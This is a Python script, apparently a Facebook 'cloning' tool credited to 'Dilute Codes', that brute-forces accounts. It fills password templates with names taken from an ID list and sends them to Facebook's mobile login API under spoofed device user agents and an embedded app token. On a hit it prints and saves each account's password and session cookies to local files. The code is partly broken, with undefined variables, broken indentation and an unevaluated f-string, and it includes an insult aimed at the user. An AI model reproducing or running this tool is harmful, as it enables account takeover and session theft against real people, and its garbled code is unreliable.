import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


#####____Samsung-Models____#####
model2 ="""M2101K6G
Aquaris U Plus
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V
> 
""".splitlines()
#####____Loop-Setup____#####   

ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Author    : Dilute Codes( Aqib Ali )
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : Dilute Codes
 ╰◈▪➣ Version   : DC Extreme [1.2]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218","Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)","Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11.1; p281 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH21 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 13; NE2213 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G10 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; G52L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T702E_EEA Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025G Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 9; ANE Build/HUAWEIANE)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T550 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0022.0)","Dalvik/2.1.0 (Linux; U; Android 10; Freebox Player POP Build/QTT8.201201.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180720.122)","Dalvik/2.1.0 (Linux; U; Android 12; RT3 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2273 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.221215.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_goog3_gpc_x86_64 Build/SE2B.220326.027)","Dalvik/2.1.0 (Linux; U; Android 11; Neo_Plus Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THA33.31-24)","Dalvik/2.1.0 (Linux; U; Android 12; SM-T865N Build/SP2A.220305.013)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-TL00 Build/HUAWEIRIO-TL00)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116UI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SO-51C Build/64.1.C.0.102A)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one action Build/PSB29.105-27)","Dalvik/2.1.0 (Linux; U; Android 11; m7332 Build/RP1A.200720.011)","Dalvik/1.6.0 (Linux; U; Android 7.1; Tecno G660MAX Build/HonorG660MAX)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N935F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SOG08 Build/63.1.C.0.582)","Dalvik/2.1.0 (Linux; U; Android 12; Dslide_809 Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT6 Build/gt6)","Dalvik/2.1.0 (Linux; U; Android 12; LAVA LXX503 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Playtv Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900N Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)","Dalvik/2.1.0 (Linux; U; Android 9; AFTWMST22 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; 7LC1 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.de.6330.d4.software Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 11; PX1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 50 Cobalt Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 13; PHP110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2238 Build/TP1A.220624.014_NONFCMOD1)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T818 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO Mobile CH9n Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T96R Build/LMY49F)","Dalvik/2.1.0 (Linux; U; Android 7.0; Moto C Build/NRD90M.041)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M24 Build/S3162)","Dalvik/2.1.0 (Linux; U; Android 10.0; T9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM3.211215.123)","Dalvik/2.1.0 (Linux; U; Android 9; SA 2K TV Build/PTO7.211209.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SNS32.34-60-6)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SF550 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A536N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230305.008.C1)",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by Aqib Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)


	def method2(self,uid,nm,pwx):
       try:
            global oks,cps,loop
            sys.stdout.write('\r\r\033[1;37m [MUGHAL-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            fs = nm.split(' ')[0]
            try:
                ls = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildvsskj(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    TM = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TM};{ckkk}"
                    print(f"\r{G} [MUGHAL-OK] {sid} [√] {ps} {W}")
                    print(f"\r{Y} [Cookie 🍪 :] {ckkk}\033[1;36m")
                    oks.append(sid)
                    open('/sdcard/MUGHAL-M2-OK.txt','a').write(sid+'[√]'+ps+'\n')
                    open('/sdcard/MUGHAL-M2-COOKIES.txt','a').write(sid+'[√]'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{R} [MUGHAL-CP] {sid} [√] {ps} {W}")
                     cps.append(sid)
                     open('/sdcard/MUGHAL-M2-CP','a').write(sid+'[√]'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(7)
            self.method2(uid,nm,pwx)
            exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()